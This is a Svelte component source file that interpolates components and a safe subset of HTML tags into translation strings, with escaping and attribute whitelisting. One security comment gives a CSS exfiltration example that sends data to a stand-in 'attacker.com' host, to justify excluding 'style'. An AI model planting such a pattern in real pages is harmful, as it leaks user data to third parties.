<script lang="ts">
    /**
     * TransRich - Component interpolation for translations
     *
     * Enables rendering Svelte components within translation strings.
     * Uses Svelte 5 snippets for slot-like functionality.
     *
     * @example Basic usage
     * Translation: "terms": "Accept <link>terms</link> and <button>privacy</button>"
     *
     * <TransRich key="terms" {t}>
     *   {#snippet link(content)}
     *     <a href="/terms">{content}</a>
     *   {/snippet}
     *   {#snippet button(content)}
     *     <Button>{content}</Button>
     *   {/snippet}
     * </TransRich>
     *
     * @example Snippets with attributes from translation tags
     * Translation: "tos": "Read our <link href='/terms'>Terms of Service</link>"
     *
     * <TransRich key="tos" {t}>
     *   {#snippet link(content, attrs)}
     *     <a href={attrs?.href ?? '/fallback'} class="text-blue-500">{content}</a>
     *   {/snippet}
     * </TransRich>
     *
     * @example Auto-rendered HTML tags (no snippet needed)
     * Translation: "info": "This is <b>important</b> and <em>urgent</em>"
     * <TransRich key="info" {t} /> <!-- works without snippets! -->
     *
     * @security Slot content passed to snippets is NOT pre-escaped.
     * Svelte's default {content} interpolation automatically escapes HTML.
     * Only use {@html content} if you explicitly trust the translation content.
     */

    import { parseComponentSlots, type SlotNode } from './parseComponentSlots.js';
    import type { Snippet } from 'svelte';

    /**
     * Safe HTML tags that are auto-rendered without requiring a snippet.
     * These are standard inline formatting tags with no security risk.
     */
    const SAFE_HTML_TAGS = ['b', 'strong', 'i', 'em', 'u', 's', 'mark', 'small', 'sub', 'sup', 'span'] as const;

    /**
     * Safe attributes that can be rendered on safe HTML tags.
     * Limited to semantic attributes to prevent XSS vectors.
     *
     * NOTE: 'style' is intentionally NOT included because it enables:
     * - CSS exfiltration via background-image: url(attacker.com?data=...)
     * - UI redressing/phishing by repositioning elements
     * Use 'class' with CSS modules/global CSS instead.
     */
    const SAFE_ATTRIBUTES = new Set(['class', 'title', 'lang', 'dir']);

    /**
     * Escape HTML special characters to prevent XSS attacks.
     * Inlined here to avoid module resolution issues in Svelte 5 template compilation.
     */
    function escapeHtml(unsafe: string): string {
        return String(unsafe)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#039;');
    }

    /**
     * Escape a string for use as an HTML attribute value.
     * Escapes quotes and other special characters.
     */
    function escapeAttrValue(value: string): string {
        return value
            .replace(/&/g, '&amp;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;');
    }

    /**
     * Serialize attributes to an HTML string, filtering to only safe attributes.
     * Returns empty string if no safe attributes, otherwise returns " attr1=\"val1\" attr2=\"val2\""
     */
    function serializeSafeAttributes(attributes: Record<string, string> | undefined): string {
        if (!attributes) return '';

        const parts: string[] = [];
        for (const [name, value] of Object.entries(attributes)) {
            // Only include whitelisted safe attributes
            if (SAFE_ATTRIBUTES.has(name.toLowerCase())) {
                parts.push(`${name}="${escapeAttrValue(value)}"`);
            }
        }

        return parts.length > 0 ? ' ' + parts.join(' ') : '';
    }

    /**
     * Check if a prop name is a DOM event handler (onclick, onmouseover, etc.)
     * These should NOT be treated as snippets to prevent runtime crashes.
     */
    function isEventHandler(name: string): boolean {
        return /^on[a-z]+$/i.test(name);
    }

    /**
     * Common utility function prop names that should NEVER be treated as snippets.
     * If a developer passes `<TransRich format={myFn} />` and the translation has
     * `<format>text</format>`, attempting to @render a regular function crashes.
     *
     * This blocklist prevents common utility functions from being misinterpreted.
     * Snippets should use descriptive names like "linkSnippet" or "boldText".
     */
    const UTILITY_FUNCTION_NAMES = new Set([
        // Formatting/transformation functions
        'format', 'formatter', 'transform', 'convert', 'parse', 'stringify',
        'encode', 'decode', 'serialize', 'deserialize', 'normalize',
        // Validation/filtering functions
        'validate', 'filter', 'sanitize', 'escape', 'clean',
        // Callback patterns
        'callback', 'handler', 'fn', 'func', 'action', 'dispatch',
        'onChange', 'onUpdate', 'onSubmit', 'onLoad', 'onError',
        // Array/collection functions
        'map', 'reduce', 'sort', 'find', 'each', 'forEach',
        // Utility patterns
        'helper', 'util', 'utils', 'render', 'compute', 'calculate',
        'get', 'set', 'fetch', 'load', 'save', 'update', 'delete',
    ]);

    /**
     * Check if a function prop name looks like a utility function rather than a snippet.
     * Returns true if the name matches common utility patterns.
     */
    function isLikelyUtilityFunction(name: string): boolean {
        const lowerName = name.toLowerCase();
        return UTILITY_FUNCTION_NAMES.has(lowerName) ||
            UTILITY_FUNCTION_NAMES.has(name) ||
            // Also block camelCase versions like "formatDate", "validateInput"
            [...UTILITY_FUNCTION_NAMES].some(util =>
                lowerName.startsWith(util) || lowerName.endsWith(util)
            );
    }

    /**
     * Check if a function is likely a Svelte 5 snippet based on heuristics.
     *
     * Svelte 5 snippets are functions that:
     * 1. Accept 0-2 parameters (content and optional attributes)
     * 2. Are not native/built-in functions (toString contains native code)
     *
     * This heuristic prevents runtime crashes from {@render} being called on
     * regular functions that happen to share a name with a translation tag.
     */
    function isLikelySnippet(fn: unknown): fn is Snippet<[string, Record<string, string> | undefined]> {
        if (typeof fn !== 'function') return false;

        // Svelte snippets receive (content, attributes) - max 2 params
        // Regular utility functions often have more parameters
        if (fn.length > 2) return false;

        // Check if it's a native function (e.g., Array.prototype methods)
        // Native functions have "[native code]" in their toString
        try {
            const fnString = Function.prototype.toString.call(fn);
            if (fnString.includes('[native code]')) return false;
        } catch {
            // If toString fails, be conservative and allow it
        }

        return true;
    }

    /**
     * HTML/SVG attributes that should NOT be passed to the translation function.
     * These are forwarded to the wrapper element instead.
     *
     * NOTE: All attributes listed here MUST also be destructured in $props()
     * and included in wrapperAttrs to ensure they reach the DOM.
     */
    const RESERVED_HTML_ATTRIBUTES = new Set([
        'class', 'style', 'id', 'title', 'lang', 'dir',
        'role', 'aria-label', 'aria-hidden', 'aria-describedby',
    ]);

    function isReservedAttribute(name: string): boolean {
        return RESERVED_HTML_ATTRIBUTES.has(name) || name.startsWith('data-');
    }

    interface Props {
        /** Translation key */
        key: string;
        /** Translation function from createI18n */
        t: (key: string, params?: Record<string, string | number | Date>) => string;
        /** Interpolation params object (alternative to spreading props) */
        params?: Record<string, string | number | Date>;
        /** HTML element tag for wrapper (default: 'span') */
        as?: keyof HTMLElementTagNameMap;
        /** CSS class for the wrapper span */
        class?: string;
        /** Inline styles for the wrapper span */
        style?: string;
        /** HTML id attribute */
        id?: string;
        /** HTML title attribute */
        title?: string;
        /** HTML lang attribute */
        lang?: string;
        /** HTML dir attribute */
        dir?: string;
        /** ARIA role attribute */
        role?: string;
        /** ARIA label for accessibility */
        'aria-label'?: string;
        /** ARIA hidden state */
        'aria-hidden'?: string;
        /** ARIA described-by reference */
        'aria-describedby'?: string;
        /** Additional interpolation params and snippets (spread props) */
        [key: string]: unknown;
    }

    let {
        key,
        t,
        params: explicitParams,
        as = 'span',
        // HTML attributes (forwarded to wrapper element)
        class: className,
        style,
        id,
        title,
        lang,
        dir,
        // ARIA attributes (critical for accessibility)
        role,
        'aria-label': ariaLabel,
        'aria-hidden': ariaHidden,
        'aria-describedby': ariaDescribedBy,
        // Everything else (snippets and translation params)
        ...rest
    }: Props = $props();

    // Collect ALL reserved HTML attributes for the wrapper element
    // This ensures attributes like aria-label reach the DOM instead of being "black-holed"
    let wrapperAttrs = $derived.by(() => {
        const attrs: Record<string, string | undefined> = {};
        if (className) attrs.class = className;
        if (style) attrs.style = style;
        if (id) attrs.id = id;
        if (title) attrs.title = title;
        if (lang) attrs.lang = lang;
        if (dir) attrs.dir = dir;
        if (role) attrs.role = role;
        if (ariaLabel) attrs['aria-label'] = ariaLabel;
        if (ariaHidden) attrs['aria-hidden'] = ariaHidden;
        if (ariaDescribedBy) attrs['aria-describedby'] = ariaDescribedBy;
        return attrs;
    });

    // Check if a tag name is a safe HTML tag
    function isSafeHtmlTag(tagName: string): boolean {
        return SAFE_HTML_TAGS.includes(tagName as typeof SAFE_HTML_TAGS[number]);
    }

    // Reactively extract snippets from rest props
    // Note: Any prop change triggers re-computation, but this is minimal overhead
    // since snippet extraction is O(n) where n = number of props (typically small)
    // Snippets receive (content, attributes) where attributes come from the parsed tag
    //
    // SAFETY CHECKS: Functions are only treated as snippets if they pass ALL checks:
    // 1. Not a DOM event handler (onclick, onmouseover, etc.)
    // 2. Not a common utility function name (format, validate, callback, etc.)
    //
    // ESCAPE HATCH: Use `snippet:` prefix to explicitly mark a function as a snippet,
    // bypassing the utility function blocklist. e.g., `snippet:get={mySnippet}` registers
    // as 'get' even though 'get' is normally blocked.
    //
    // This prevents runtime crashes when developers accidentally pass utility functions
    // that match tag names in translations.
    //
    let snippets = $derived.by(() => {
        let s: Record<string, Snippet<[string, Record<string, string> | undefined]>> | undefined;
        for (const k in rest) {
            const v = rest[k];

            // Allow explicit snippet: prefix to bypass utility function check
            // e.g., snippet:get -> registers as 'get' snippet
            let snippetName = k;
            let bypassCheck = false;
            if (k.startsWith('snippet:')) {
                snippetName = k.slice(8); // Remove 'snippet:' prefix
                bypassCheck = true;
            }

            // Multi-layer safety checks to prevent @render crashes:
            // 1. Must be a function
            // 2. Must not be a DOM event handler (onclick, etc.)
            // 3. Must pass snippet heuristic (arity <= 2, not native)
            // 4. Must not be a utility function name (unless bypassed with snippet: prefix)
            if (
                typeof v === 'function' &&
                !isEventHandler(snippetName) &&
                isLikelySnippet(v) &&
                (bypassCheck || !isLikelyUtilityFunction(snippetName))
            ) {
                s ??= {};
                s[snippetName] = v as Snippet<[string, Record<string, string> | undefined]>;
            }
        }
        return s ?? {};
    });

    // Reactively build params object from rest props and explicit params
    let typedParams = $derived.by(() => {
        const p: Record<string, string | number | Date> = {};

        // First, add explicit params if provided
        if (explicitParams) {
            Object.assign(p, explicitParams);
        }

        // Then, add rest params (non-function spread props), excluding reserved HTML attributes
        for (const [k, v] of Object.entries(rest)) {
            if (typeof v === 'string' || typeof v === 'number' || v instanceof Date) {
                // Skip reserved HTML attributes like class, style, id, data-*
                if (!isReservedAttribute(k)) {
                    p[k] = v;
                }
            }
        }

        return Object.keys(p).length > 0 ? p : undefined;
    });

    // Get translated content and parse it
    let content = $derived(t(key, typedParams));
    let nodes = $derived(parseComponentSlots(content));
</script>

<!-- Wrapper element with forwarded HTML attributes (class, style, id, etc.) -->
<svelte:element this={as} {...wrapperAttrs}>
    {#each nodes as node}
        {#if node.type === 'text'}
            <!-- Text nodes rendered via Svelte interpolation (auto-escaped) -->
            {node.content}
        {:else if node.type === 'slot' && node.name}
            {#if snippets[node.name]}
                <!-- Custom snippet provided - content is passed raw, snippet uses {content} for auto-escaping -->
                <!-- Attributes from the parsed tag (e.g., <link href="/test">) are passed as second argument -->
                {@render snippets[node.name](node.slotContent || '', node.attributes)}
            {:else if isSafeHtmlTag(node.name)}
                <!-- Auto-render safe HTML tags (b, strong, em, i, etc.) with safe attributes -->
                <!-- Content is escaped here since we're using @html for the wrapper tag -->
                <!-- Attributes are filtered to a whitelist (class, id, style, etc.) and escaped -->
                <!-- eslint-disable-next-line svelte/no-at-html-tags -->
                {@html `<${node.name}${serializeSafeAttributes(node.attributes)}>${escapeHtml(node.slotContent || '')}</${node.name}>`}
            {:else}
                <!-- Fallback: render slot content as text if no snippet provided (auto-escaped by Svelte) -->
                {node.slotContent || ''}
            {/if}
        {/if}
    {/each}
</svelte:element>
